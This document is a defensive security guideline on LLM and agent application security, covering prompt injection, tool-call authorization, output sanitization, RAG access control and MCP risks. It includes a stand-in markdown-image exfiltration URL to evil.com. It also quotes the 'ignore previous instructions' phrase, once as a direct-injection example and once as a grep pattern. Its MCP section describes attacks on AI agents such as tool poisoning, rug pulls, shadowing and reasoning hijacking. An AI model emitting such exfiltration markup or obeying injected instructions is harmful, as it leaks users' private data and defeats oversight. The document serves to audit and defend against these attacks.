# 08 — LLM & AI Application Security

Scope: prompt injection boundaries, tool-call authorization, model-output
handling, RAG/data-plane risks, agent loop containment.
Maps to OWASP LLM Top 10 2025 (LLM01 Prompt Injection, LLM05 Improper Output
Handling, LLM06 Excessive Agency, LLM08 Vector/Embedding Weaknesses) and the
OWASP Top 10 for Agentic Applications 2026 (ASI01 Agent Goal Hijack, ASI02 Tool
Misuse, ASI05 Unexpected Code Execution, ASI06 Memory & Context Poisoning,
ASI07 Insecure Inter-Agent Communication), CWE-77/94/441/863 analogues. Use
both lists when auditing tool-using agents; the agentic list's core principle —
**least-agency**: grant the minimum autonomy the task needs — is this file's §1–2
in one word.

Core principle: **the model is an untrusted interpreter that executes natural
language.** Anything that reaches the context window — user messages, retrieved
documents, web pages, tool results, file contents — is potential instruction.
There is no reliable in-band defense; security comes from *out-of-band*
architecture: what the model is allowed to do, see, and emit is enforced by
code around it, never by the prompt itself.

## 1. Prompt injection boundaries (LLM01)

- Assume injection succeeds. Design question: "when (not if) the model obeys
  attacker text, what can it actually do?" Bound that blast radius first.
- **Direct injection** (user typing "ignore previous instructions") matters
  mostly when the prompt guards something — never put secrets, hidden business
  rules, or authorization decisions in the system prompt; assume full prompt
  disclosure (LLM07).
- **Indirect injection** is the serious one: instructions embedded in content
  the model processes — web pages, emails, PDFs, code comments, calendar
  invites, RAG chunks, prior tool output. Any pipeline where the model reads
  third-party content and can then *act* (tools) or *render* (output to user)
  is the attack path.
- Structural mitigations (stack them; none is sufficient alone):
  - **Privilege separation by context**: untrusted content goes in delimited
    data sections with explicit "this is data, not instructions" framing, and —
    stronger — separate model calls: a quarantined call summarizes/extracts
    from untrusted content with **no tools**, returning structured data; only
    the trusted-context call gets tool access (dual-LLM pattern).
  - **Capability gating on taint**: once a session/agent has ingested untrusted
    content, downgrade what it may do (e.g. can no longer call
    send_email/exfiltrate-capable tools) — taint tracking at the orchestrator.
  - Prompt-injection classifiers/heuristics as telemetry and friction, not as
    the security boundary.
- The lethal trifecta to refuse by design: (a) access to private data +
  (b) exposure to untrusted content + (c) an exfiltration channel (tool that
  sends data out, markdown image rendering, link generation). Any agent with
  all three is exploitable; remove or gate one leg.

```python
# GOOD: orchestrator-level taint gating (illustrative)
class Session:
    tainted: bool = False           # set True when untrusted content enters context

def ingest(session, content, source):
    if source.trust != "first_party":
        session.tainted = True
    session.context.append(wrap_as_data(content, source))   # delimited, labeled

def allowed_tools(session):
    if session.tainted:
        return [t for t in session.tools
                if t.read_only and not t.exfil_capable]      # no send_email, no fetch_url
    return session.tools
```

- **Memory/persistence poisoning**: long-term agent memory, scratchpads, and
  "learned preferences" written while processing untrusted content become
  persistent injections replayed into every future session. Gate memory writes
  (human-visible, schema-constrained, provenance-tagged), and make memory
  user-scoped — one user's poisoned memory must never reach another's session.
- Multi-agent systems: each hop is a trust boundary. Agent B must not treat
  agent A's output as instructions-with-A's-privileges; propagate taint and
  the original human principal through the whole chain (rules/03 §6 deputy
  rules apply between agents).

## 2. Tool-call authorization (LLM06 — excessive agency)

- **Authorization is enforced by the tool layer, never by the prompt.** "Only
  call delete_user for admins" in a system prompt is not a control. The tool
  executor checks the *human principal's* permissions on every invocation —
  the model's request is an unauthenticated suggestion (confused deputy,
  rules/03 §6: the agent is the deputy).
- Run tools with the **user's identity and scopes**, not a god-mode service
  account: pass the user's token/context through; an agent serving user A must
  be physically unable to read user B's data (tenant scoping at the data
  layer, rules/03 §5).
- Least-capability toolset: expose the minimal tools per task; narrow
  parameters (e.g. `search_orders(customer_id=<bound from session>)` — the
  model never supplies the customer_id); read-only by default, mutation tools
  separate and gated.
- **Validate tool arguments like any untrusted input** — model output IS
  untrusted input (rules/01 applies in full): schema-validate, then apply the
  same SQLi/path traversal/SSRF/command-injection guards as for user input.
  A `fetch_url` tool needs the complete SSRF defense from rules/01 §5.
- Human-in-the-loop for irreversible/high-impact actions (payments, deletes,
  external sends, code execution): explicit confirmation showing the *actual
  parameters*, not the model's summary of them; batch approvals and
  "always allow" defeat the control — scope them narrowly.
- Rate-limit and budget-limit per session: max tool calls, max spend, max
  loop iterations (agent loops are resource-exhaustion surfaces, rules/06 §5).
- Audit-log every tool invocation: principal, session, full arguments, result
  size, taint state — agent actions must be attributable and reconstructible.

```python
# GOOD: executor-side enforcement, model never sees other tenants
def execute_tool(call, session):
    spec = TOOL_REGISTRY[call.name]              # unknown tool -> reject
    args = spec.schema.parse(call.arguments)     # strict schema, extra=forbid
    authorize(session.user, spec.permission)      # user's perms, not model's
    args = spec.bind_session_scope(args, session) # tenant/user ids from session
    if spec.high_impact: require_user_confirmation(session, spec, args)
    return spec.run(args, credentials=session.user_creds)
```

## 3. Output handling (LLM05 — improper output handling)

- Model output is **untrusted, attacker-influenceable data**. Every sink needs
  the corresponding defense:
  - Rendered in web UI → encode/sanitize like user content (rules/05 §1).
    Rendering model markdown as HTML without sanitization is stored XSS;
    **markdown image/link URLs are an exfiltration channel**
    (`![](https://evil.com/?q=<secrets from context>)`) — proxy or strip
    external images, allowlist link domains, CSP `img-src` as backstop.
  - Executed as code (codegen, "run this SQL", eval'd snippets) → treat as RCE
    by design: sandbox (no network, ephemeral FS, resource caps), review gates
    for anything persisted; never `eval` model output in the app process
    (CWE-94).
  - Used in queries/commands/paths → parameterize/validate exactly as rules/01.
  - Fed to another model or template → injection chains; keep the data/
    instruction separation at every hop.
```python
# GOOD: model markdown -> safe HTML (chat UI)
html = markdown_to_html(model_output)
html = DOMPurify_equivalent.sanitize(html, allow=BASIC_TAGS)   # rules/05 §1
html = rewrite_images(html, lambda src:
         PROXY_URL + sign(src) if allowed_image_host(src) else DROP)  # exfil channel
html = rewrite_links(html, require_scheme={"https"}, mark_external=True)
# plus CSP img-src 'self' proxy.example as the backstop (rules/05 §2)
```

```python
# GOOD: sandbox floor for model-generated code execution
run_in_sandbox(code,
    network="none",                  # or allowlist of package mirrors at build step
    fs=ephemeral_overlay(),          # nothing persists, no host mounts
    limits=dict(cpu_s=10, mem_mb=512, pids=64, wallclock_s=30),
    user="nobody", seccomp=STRICT_PROFILE)
# container alone is not a sandbox; gVisor/Firecracker-class isolation for hostile code
```

- Parse structured output strictly: schema-validate JSON tool calls/extractions
  (`extra=forbid`, types, ranges); on failure reject/retry — don't "best-effort
  repair" your way into accepting injected structure.
- Don't trust model self-reports: "I have verified the user is authorized" or
  fabricated tool results must have no effect — state lives in the
  orchestrator, decisions come from code.
- Content-safety/PII filters on output where the application demands it —
  applied post-generation in code, with the same redaction discipline as logs
  (rules/07 §2): model responses must not echo secrets present in context
  (keys, other users' data) — best fixed by not putting them in context.

## 4. RAG & data-plane risks (LLM08)

- Retrieval is an authorization surface: **enforce the querying user's ACLs at
  retrieval time** (filter by permitted doc IDs/tenant in the vector store
  query). Embedding-then-retrieving across tenants is a cross-tenant leak even
  if the model "promises" not to reveal it. Don't embed content the user
  population may never see, or partition indexes per tenant.
```python
# GOOD: ACL filtering happens in the vector store query, not after retrieval
results = vstore.search(
    embedding=embed(query),
    filter={"tenant_id": session.tenant_id,            # session-derived, rules/03
            "doc_id": {"$in": acl.readable_doc_ids(session.user)}},
    top_k=8)
# BAD: vstore.search(embedding, top_k=8) then "the model will respect permissions"
```

- Poisoning: anyone who can write to ingested sources (wikis, tickets, public
  web) can plant indirect injections or biased "facts". Provenance-tag chunks,
  prefer curated sources for action-driving context, and surface citations so
  humans can verify.
- Membership/extraction: embeddings are not anonymization — vectors can be
  inverted approximately; protect vector stores like the source documents
  (encryption, access control, no public endpoints).
- **Self-hosted vector DBs ship auth-OFF by default** (Qdrant, among others):
  set an API key / JWT, enable TLS, and bind to an internal-only network — an
  exposed keyless vector endpoint is full corpus read/write (poisoning + theft).
  Restrict *write* access to the ingestion pipeline identity only, and hash each
  ingested document (e.g. SHA-256) so tampered/poisoned chunks are detectable
  and excludable at retrieval.
- Cache keyed on prompts must be principal-scoped (semantic caches returning
  user A's answer — containing A's data — to user B).

## 5. Platform & supply-chain notes

- Treat downloaded models/weights/adapters like executable dependencies:
  pinned versions, checksums, trusted registries; `pickle`-loaded checkpoints
  are arbitrary code execution (rules/01 §8) — use safetensors.
- System prompts, tool definitions, and guardrail configs are security-relevant
  code: version them, review changes, test with an adversarial suite
  (injection corpus + your own red-team cases) in CI; regression-test on every
  model/prompt upgrade since behavior shifts.

```python
# GOOD: adversarial regression tests assert ORCHESTRATOR behavior, not model politeness
@pytest.mark.parametrize("payload", load_corpus("injections.jsonl"))
def test_indirect_injection_cannot_trigger_tools(agent, payload):
    doc = make_document(body=payload)            # injection inside retrieved content
    result = agent.run("summarize this document", docs=[doc])
    assert result.tool_calls_outside(["search_docs"]) == []   # taint gate held
    assert no_external_urls(result.rendered_html)             # no exfil markup
# the assertion is on enforced capability, so it stays green across model upgrades
```
- MCP and third-party tool servers: a tool's *description* is prompt-injectable
  too (tool poisoning); pin/review tool manifests, prefer allowlisted servers,
  and apply §2 executor-side authorization regardless of what the server claims.
  Remote MCP servers must require auth (the MCP spec's OAuth-based authorization,
  spec rev 2025-11-25) — unauthenticated internet-exposed MCP servers and
  trojaned MCP packages are recurring 2026 incident patterns (see NSA's CSI
  "Model Context Protocol (MCP): Security Design Considerations", May 2026).
  Agent config files the harness
  executes (hooks, settings, MCP server definitions checked into repos) are a
  code-execution surface: review them like CI config, never let the agent
  write them unapproved.
- Named MCP/agent attack classes — use these names in findings (IDs: OWASP MCP
  Top 10 MCP03:2025 Tool Poisoning, with rug pulls and shadowing as
  sub-techniques; MITRE ATLAS AML.T0104 Publish Poisoned AI Agent Tool):
  - **Tool poisoning**: malicious instructions hidden in tool
    descriptions/schemas/metadata that the model reads but UIs truncate.
    Mitigate: pin + review full tool definitions at install, diff on change,
    render complete descriptions to the human approver.
  - **Rug pull**: a tool/server changes its definition or behavior *after*
    approval. Mitigate: hash/pin tool definitions, force re-approval on any
    change, version-lock MCP servers like dependencies.
  - **Tool shadowing**: a malicious server's tool description manipulates how
    the model uses ANOTHER server's tools (no malicious tool need ever be
    called). Mitigate: minimize concurrent servers, isolate high-privilege
    tools in separate sessions/agents, egress controls as backstop.
  - **Line jumping**: injection via tool metadata at `tools/list` time — the
    model is influenced before any tool is invoked, so invocation-time gates
    never fire. Mitigate: treat tool listings as untrusted input; gate the
    *connection* on description review, not just calls on approval.
  - **Preference manipulation (MPMA)**: persuasive/manipulative tool
    descriptions bias the model toward an attacker's server over legitimate
    ones. Mitigate: allowlisted servers; review descriptions for
    superlatives and instructions, not just server code.
  - **Reasoning-model attacks**: CoT hijacking / H-CoT — attacker text
    mimicking the model's own reasoning, smuggled into context to steer
    safety/tool decisions; and OverThink-class slowdowns — decoy problems
    planted in retrieved content force excessive reasoning tokens
    (cost/latency DoS, unbounded-consumption class). No OWASP/ATLAS IDs
    assigned yet. Mitigate: never feed untrusted content as reasoning
    scaffold/thinking context, cap reasoning-token budgets per request,
    alert on token-consumption anomalies.
- Log prompts/completions for forensics, but apply rules/07 hygiene — context
  windows routinely contain PII and secrets; redact before storage, scope
  retention.

## 6. Audit grep starters

```text
f-string/template building prompts from request data with no data/instruction framing
tools=|functions=|tool_choice passed where context includes fetched/retrieved content
eval\(|exec\(|subprocess|os.system near model output / completion variables
dangerouslySetInnerHTML|innerHTML|v-html rendering completion/message content
markdown render of model output without sanitize/image-proxy step
vector_store.search|similarity_search without tenant/ACL filter argument
api_key|system_prompt containing credentials, internal URLs, or authz rules
torch.load\(|pickle.load on downloaded checkpoints (want: safetensors)
tool handlers reading user_id/tenant_id from model-supplied arguments
"ignore previous"/role-play guards in prompts standing in for code-level checks
mcpServers|\.mcp\.json|claude_desktop_config entries without version pin or definition hash
```

## Audit checklist

- [ ] Is there any path where third-party content (web, docs, email, RAG, tool results) reaches a model that holds tools or sensitive context — and if so, is it quarantined (no-tool call, taint-gated capabilities)?
- [ ] Does the architecture avoid the lethal trifecta (private data + untrusted content + exfiltration channel) per agent, or gate one leg?
- [ ] Are there zero secrets, credentials, or authorization rules living only in prompts?
- [ ] Is every tool call authorized in code against the human principal's permissions, with session-bound scoping (tenant/user IDs never model-supplied)?
- [ ] Are tool arguments schema-validated and passed through the full rules/01 input defenses (SSRF, path, SQL, command)?
- [ ] Do irreversible/high-impact actions require human confirmation displaying actual parameters, with per-session call/spend/iteration budgets?
- [ ] Is model output sanitized per sink — HTML-encoded/sanitized for UI, external markdown images blocked/proxied, never eval'd in-process, parameterized into queries?
- [ ] Is structured model output strictly schema-parsed with rejection (no lenient repair)?
- [ ] Does RAG retrieval enforce the caller's document ACLs/tenant in the store query, with provenance on chunks?
- [ ] Are prompt/completion logs redacted, and semantic caches principal-scoped?
- [ ] Are model artifacts checksum-pinned (safetensors, no pickle) and prompts/tool manifests version-controlled with adversarial regression tests?
- [ ] Is every tool invocation audit-logged with principal, arguments, and taint state?
- [ ] Are agent memory writes gated, provenance-tagged, and strictly user-scoped (no cross-user persistence)?
- [ ] In multi-agent chains, do taint and the human principal propagate across every hop?
- [ ] Is model-generated code executed only in network-isolated, resource-capped, ephemeral sandboxes?
- [ ] Are MCP tool definitions hash-pinned at approval with re-approval forced on any change (rug pull), and is the *full* description shown to the approver (tool poisoning)?
- [ ] Are high-privilege tools isolated from third-party servers in separate sessions/agents (tool shadowing), with tool listings treated as untrusted input before any invocation (line jumping)?
- [ ] Are reasoning-token budgets capped per request with consumption-anomaly alerting (OverThink-class), and is untrusted content kept out of reasoning scaffolds (H-CoT/CoT hijacking)?
